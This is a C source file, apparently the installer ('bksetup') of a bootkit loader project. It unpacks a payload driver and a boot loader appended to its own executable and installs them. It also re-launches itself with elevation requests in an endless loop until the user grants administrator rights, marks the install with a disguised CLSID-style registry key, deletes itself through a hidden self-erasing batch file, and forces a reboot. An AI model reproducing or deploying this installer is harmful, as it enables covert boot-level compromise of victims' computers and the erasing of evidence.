//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2.2
//	
// module: bksetup.c
// $Revision: 68 $
// $Date: 2012-06-04 19:49:34 +0400 (Пн, 04 июн 2012) $
// description: 
//	Sample BK installer utility.

#include <Shlwapi.h>
#include "main.h"
#include "bklib.h"
#include "..\bklib\pesup.h"
#include "joiner.h"


#define DOS_NAME_LEN	8+1+3+1	// 8.3 name size in chars with 0
#define	tczOpen			_T("open")
#define	tczRunas		_T("runas")
#define tczBkSlash		_T("\\")
#define tczBatFmt		_T("%lu.bat")
#define tczBatchFile	_T("attrib -r -s -h%%1\r\n:%u\r\ndel %%1\r\nif exist %%1 goto %u\r\ndel %%0\r\n")
#define szKernel32		"KERNEL32.DLL"

#define GUID_STR_LEN	16*2+4+2	// length of the GUID string in chars
#define tczGuidStrTempl	_T("{%08X-%04X-%04X-%04X-%08X%04X}")
#define	tczProgramKey	_T("Software\\Classes\\CLSID\\")
#define	tczLocal		_T("Local\\")


typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

HANDLE	g_AppHeap = 0;
ULONG	g_CurrentOsVersion = 0;
ULONG	g_CurrentProcessId = 0;
PIMAGE_DOS_HEADER	g_CurrentModuleBase = NULL;



__declspec(dllimport)
HRESULT CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates pseudo random number based on the specified seed value.
//	Since NtRandom on Vista returns process-specific results, we use this function to create inter-process common names.
//
ULONG MyRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


// Application defined memory allocation\freeing routines used by different static libraries
PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(vAlloc(Size));
}

VOID __stdcall	AppFree(PVOID pMem)
{
	vFree(pMem);
}

// Application defined rand() routine used by different static libraries
ULONG __stdcall AppRand(VOID)
{
	return(GetTickCount());
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates a GUID based on the specified seed value. The same seeds will create the same GUIDs on the same machine.
//
VOID GenGuid(GUID* pGuid, PULONG pSeed)
{
	ULONG i;
	pGuid->Data1 = MyRandom(pSeed);
	pGuid->Data2 = (USHORT)MyRandom(pSeed);
	pGuid->Data3 = (USHORT)MyRandom(pSeed);
	for (i=0; i<8; i++)
		pGuid->Data4[i] = (UCHAR)MyRandom(pSeed);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Converts the specified GUID structure into 0-terminated string.
//
LPTSTR GuidToString(GUID* pGuid)
{
	LPTSTR GuidStr = (LPTSTR)vAlloc((GUID_STR_LEN+1)*sizeof(_TCHAR));
	if (GuidStr)
		wsprintf(GuidStr, tczGuidStrTempl, pGuid->Data1, pGuid->Data2, pGuid->Data3, *(USHORT*)&pGuid->Data4[0], *(ULONG*)&pGuid->Data4[2],  *(USHORT*)&pGuid->Data4[6]);

	return(GuidStr);
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates a string containig the Prefix, random GUID based on spesified Seed, and the Postfix.
//
LPTSTR GuidName(
				IN OUT	PULONG pSeed,				// pointer to a random seed value
				IN		LPTSTR Prefix OPTIONAL		// pointer to a prefix string (optional)
				)
{
	ULONG	NameLen = GUID_STR_LEN + 1;
	LPTSTR	GuidStr, Name = NULL;
	GUID	Guid;

	GenGuid(&Guid, pSeed);
	if (GuidStr = GuidToString(&Guid))
	{
		if (Prefix)
			NameLen += lstrlen(Prefix);

		if (Name = (LPTSTR)vAlloc(NameLen*sizeof(_TCHAR)))
		{
			Name[0] = 0;

			if (Prefix)
				lstrcpy(Name, Prefix);
		
			lstrcat(Name, GuidStr);
		}
		vFree(GuidStr);
		
	}	// if (GuidStr = 
	return(Name);
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns TRUE if the specified PID belongs to a WOW64 process.
//
BOOL	IsProcessWow64(ULONG Pid)
{
	BOOL Ret =  FALSE;
	LPFN_ISWOW64PROCESS fnIsWow64Process = NULL;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandleA(szKernel32),"IsWow64Process");
	if (fnIsWow64Process)
	{
		HANDLE	hProcess;
		if (hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid))
		{
			if (!fnIsWow64Process(hProcess, &Ret))
				// An error occured: unable to get OS architecture type. Assume we are on x86 and process is not WOW64 process.
				Ret = FALSE;
			CloseHandle(hProcess);
		}
	}	// if (fnIsWow64Process)
	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates a buffer and fills it with the full path of the executable file of the current process.
//  The caller is responsable for freeing the buffer.
//	If the function fails, the return value is NULL. To get extended error information, call GetLastError.
//
static LPTSTR GetCurrentProcessFilePath(VOID)
{
	ULONG	nSize = MAX_PATH;
	ULONG	rSize = 0;
	LPTSTR	FilePath = (LPTSTR)vAlloc(nSize*sizeof(_TCHAR));

	while ((FilePath) && (rSize = GetModuleFileName(NULL, FilePath, nSize)) == nSize)
	{
		// Buffer is not large enough 
		vFree(FilePath);
		nSize += MAX_PATH;
		FilePath = (LPTSTR)vAlloc(nSize*sizeof(_TCHAR));
	}

	if ((FilePath) && (rSize == 0))
	{
		// GetModuleFileName() returned an error 
		vFree(FilePath);
		FilePath = NULL;
	}

	return(FilePath);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates the BAT file with the specified name and content and runs it with the specified parameters string.
//
#pragma warning (push)
#pragma warning (disable: 4311)	//  'type cast' : pointer truncation from 'HINSTANCE' to 'WINERROR'
static WINERROR CreateAndStartBat(
			LPTSTR FilePath,		// Name of the BAT file to create
			PCHAR Content,			// Content of the BAT file
			LPTSTR ParamStr			// Parameters string for the BAT file
			)
{
	WINERROR Status = NO_ERROR;
	HANDLE hFile;
	ULONG Written;

	hFile = CreateFile(FilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{

		if (!WriteFile(hFile, Content,(ULONG)lstrlen(Content), &Written, NULL))
			Status = GetLastError();

		CloseHandle(hFile);

		if (Status == NO_ERROR)
		{
			HINSTANCE hInst = ShellExecute(0, tczOpen, FilePath, ParamStr, NULL, SW_HIDE);
			if (hInst < (HINSTANCE)32)
				Status = (WINERROR)hInst;
		}
	}
	else
		Status = GetLastError();

	return(Status);
}
#pragma warning (pop)


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates a BAT file that attemts to delete this module in infinite loop.
//	Then this BAT file deletes itself.
//
static WINERROR DoSelfDelete(VOID)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	LPTSTR	ThisFilePath	= NULL;
	LPTSTR	BatFilePath		= NULL;
	LPTSTR	BatFileParam	= NULL;

	do 
	{
		LPTSTR	FileName, BatFile;
		ULONG	NameLen;

		if (!(ThisFilePath = GetCurrentProcessFilePath()))
			break;

		NameLen = (ULONG)lstrlen(ThisFilePath);

		// It's guaranteed that BAT file path string will fit into the BatFilePath buffer 
		if (!(BatFilePath = (LPTSTR)vAlloc((NameLen + DOS_NAME_LEN)*sizeof(_TCHAR))))
			break;

		if (!(BatFileParam = (LPTSTR)vAlloc((NameLen+3)*sizeof(_TCHAR))))	// 2 chars for "" and one for 0
			break;

		lstrcpy(BatFilePath, ThisFilePath);
		FileName = strrchr(BatFilePath, _T('\\'));
		ASSERT(FileName);
		FileName += 1;

		wsprintf(FileName, tczBatFmt, GetTickCount());
		wsprintf(BatFileParam, _T("\"%s\""), ThisFilePath);		

		if (BatFile = (LPTSTR)vAlloc(MAX_PATH * sizeof(_TCHAR)))
		{
			ULONG	Label = GetTickCount();

			wsprintf(BatFile, tczBatchFile, Label, Label);
			Status = CreateAndStartBat(BatFilePath, BatFile, BatFileParam);

			vFree(BatFile);
		}
	
	}while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (ThisFilePath)
		vFree(ThisFilePath);

	if (BatFilePath)
		vFree(BatFilePath);

	if (BatFileParam)
		vFree(BatFileParam);

	return(Status);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Enables SeShutdownPrivilege for the current process and attempts to reboot the system.
//
VOID Reboot(VOID)
{
	BOOL OldValue;

	if (NT_SUCCESS(RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue)))
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}


//
//	Allocates buffers and generates pseudo-random program key and mutex names, using system volume serial number 
//	 as random seed. The caller is responsable for freeing buffers.
//	
BOOL GetProgramKeyName(
	PCHAR* pKeyName,
	PCHAR* pMutexName
	)
{
	BOOL	Ret = FALSE;
	PCHAR	KeyName = NULL, MutexName = NULL, RootDir;
	ULONG	VolumeSerial = 0;

	if (RootDir = vAlloc(PAGE_SIZE))
	{
		if (GetWindowsDirectory(RootDir, PAGE_SIZE))
		{
			PCHAR	Slash = strchr(RootDir, '\\');
			if (Slash)
				Slash[1] = 0;

			if (GetVolumeInformation(RootDir, NULL, 0, &VolumeSerial, NULL, NULL, NULL, 0))
			{
				if ((KeyName = GuidName(&VolumeSerial, tczProgramKey)) && (MutexName = GuidName(&VolumeSerial, tczLocal)))
				{
					*pKeyName = KeyName;
					*pMutexName = MutexName;
					Ret = TRUE;
				}
			}	// if (GetVolumeInformation(RootDir, NULL, 0, &VolumeSerial, NULL, NULL, NULL, 0))
		}	// if (GetWindowsDirectory(RootDir, PAGE_SIZE))
		vFree(RootDir);
	}	// if (RootDir = vAlloc(PAGE_SIZE))

	return(Ret);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Restarts current process with UAC elevation request message.
//	
VOID	RequestUac(VOID)
{
	PCHAR	ModulePath;
	SHELLEXECUTEINFO	ExecInfo = {0};
	// Checking for UAC elevated token
	
	if (ModulePath = vAlloc(0x1000))
	{
		if (GetModuleFileName(NULL, ModulePath, 0x1000))
		{
			CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

			ExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
			ExecInfo.lpVerb = tczRunas;
			ExecInfo.lpFile = ModulePath;

			while(!ShellExecuteEx(&ExecInfo));
		}	// if (GetModuleFileName(NULL, ModulePath, 0x1000))
		vFree(ModulePath);
	}	// if (ModulePath = vAlloc(0x1000))
}

/*
void WriteAllBytes( const char* nameFile, char* data, int c_data )
{
	HANDLE file = CreateFile( nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
	DWORD dw;
	WriteFile( file, data, c_data, &dw, 0 );
	CloseHandle(file);
}
*/
//
//	Installs the BK initial loader and a payload driver depending on current architecture.
//
WINERROR	SetupBk(
	BOOL IsExe,		// specify TRUE if the function called from an EXE file. It will enable UAC elevation and self-delete. 
	BOOL bReboot	// specify TRUE if reboot needed after install
	)
{
	WINERROR	Status;
	CHAR		VersionHi, VersionLo;
	BOOL		Elevated = TRUE;
	ULONG		OsVersion, PayloadSize, BootSize;
	PCHAR		MutexName = NULL, KeyName = NULL, Payload = NULL, BootLoader = NULL;
	HKEY		hKey;
	HANDLE		hMutex = 0;

		
	do	// not a loop
	{
		// Generating pseudo-random program key name 
		if (!GetProgramKeyName(&KeyName, &MutexName))
		{
			DbgPrint("BKSETUP: Failed generating program key and mutex name.\n");
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Checking if the application already running
		if (!(hMutex = CreateMutex(NULL, TRUE, MutexName)) || ((Status = GetLastError()) == ERROR_ALREADY_EXISTS))
		{
			DbgPrint("BKSETUP: An other copy of the program already running.\n");
			Status = ERROR_SERVICE_ALREADY_RUNNING;
			break;		
		}

		// Checking if we were already installed
		if (RegOpenKey(HKEY_LOCAL_MACHINE, KeyName, &hKey) == NO_ERROR)
		{
			RegCloseKey(hKey);
			DbgPrint("BKSETUP: Already installed.\n");
			Status = ERROR_ALREADY_EXISTS;
			break;
		}

		OsVersion = GetVersion();
		VersionHi = LOBYTE(LOWORD(OsVersion));
		VersionLo = HIBYTE(LOWORD(OsVersion));

		// Checking if current OS supported
		if ((VersionHi == 5 && VersionLo == 0) || VersionHi < 5 || VersionHi > 6)
		{
			Status = ERROR_OLD_WIN_VERSION;
			DbgPrint("BKSETUP: OS not supported.\n");
			break;
		}

		// Running as separate executable
		if (VersionHi == 6)
		{
			// For Vista and higher:
			// Checking for UAC elevated token
			HANDLE	hToken;
			ULONG	bSize;

			Elevated = FALSE;
			if (OpenProcessToken(GetCurrentProcess(), READ_CONTROL | TOKEN_QUERY, &hToken))
			{
				GetTokenInformation(hToken, 20, &Elevated, sizeof(BOOL), &bSize);
				CloseHandle(hToken);
			}
		}	// if (VersionHi >= 6)

		if (!Elevated)
		{
			// Running with low integrity access token
			if (IsExe)
			{
				// Releasing program mutex
				CloseHandle(hMutex);
				hMutex = 0;

				// Requesting elevation
				RequestUac();
			}
			Status = ERROR_ACCESS_DENIED;
			DbgPrint("BKSETUP: Not enough privileges to complete installation.\n");
			break;
		}	// if (!Elevated)


		// Unpacking joined module depending on current OS architecture
		if (!GetJoinedData(g_CurrentModuleBase, &Payload, &PayloadSize, IsProcessWow64(g_CurrentProcessId), 0, TARGET_FLAG_DRV))
		{
			Status = ERROR_FILE_NOT_FOUND;
			DbgPrint("BKSETUP: No joined payload found.\n");
			break;
		}

		// Unpacking joined initial loader
		if (!GetJoinedData(g_CurrentModuleBase, &BootLoader, &BootSize, FALSE, 0, TARGET_FLAG_BINARY))
		{
			Status = ERROR_FILE_NOT_FOUND;
			DbgPrint("BKSETUP: No joined BK loader found.\n");
			break;
		}

		// Installing the boot loader
		Status = BkSetupWithPayload(BootLoader, BootSize, Payload, PayloadSize);
		vFree(BootLoader);

		if (Status != NO_ERROR)
		{
			DbgPrint("BKSETUP: Installation failed because of unknown reason.\n");
			break;
		}

		// Creating program key to mark that we were installed
		if (RegCreateKey(HKEY_LOCAL_MACHINE, KeyName, &hKey) == NO_ERROR)
			RegCloseKey(hKey);

		Status = NO_ERROR;
		DbgPrint("BKSETUP: Successfully installed.\n");
	} while(FALSE);

	if (hMutex)
		CloseHandle(hMutex);

	if (Payload)
		vFree(Payload);

	if (KeyName)
		vFree(KeyName);

	if (MutexName)
		vFree(MutexName);

	if (IsExe)
		DoSelfDelete();

	if (Status == NO_ERROR && bReboot)
	{
		// One second timeout to let the Self Delete BAT-file initialize, then reboot.
		Sleep(1000);
		Reboot();
	}
	
	return(Status);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	 This is our application EntryPoint function.
//
WINERROR APIENTRY _tWinMain(
				HINSTANCE hInstance,
                HINSTANCE hPrevInstance,
                LPTSTR    lpCmdLine,
                int       nCmdShow
				)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("BKSETUP: Version: 1.0\n");
	g_CurrentProcessId = GetCurrentProcessId();
	DbgPrint("BKSETUP: Started as win32 process 0x%x.\n", g_CurrentProcessId);

	g_CurrentModuleBase = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	Status = SetupBk(TRUE, TRUE);

	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(hInstance);

	DbgPrint("BKSETUP: Process 0x%x finished with status %u.\n", g_CurrentProcessId, Status);

	return(Status);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	 This is our application EntryPoint function to build it without CRT startup code.
//
INT _cdecl main(VOID)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("BKSETUP: Version: 1.0\n");
	g_CurrentProcessId = GetCurrentProcessId();
	DbgPrint("BKSETUP: Started as win32 process 0x%x\n", g_CurrentProcessId);

	g_CurrentModuleBase = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	Status = SetupBk(TRUE, TRUE);

	DbgPrint("BKSETUP: Process 0x%x finished with status %u\n",g_CurrentProcessId, Status);
	ExitProcess(Status);
	return(Status);
}
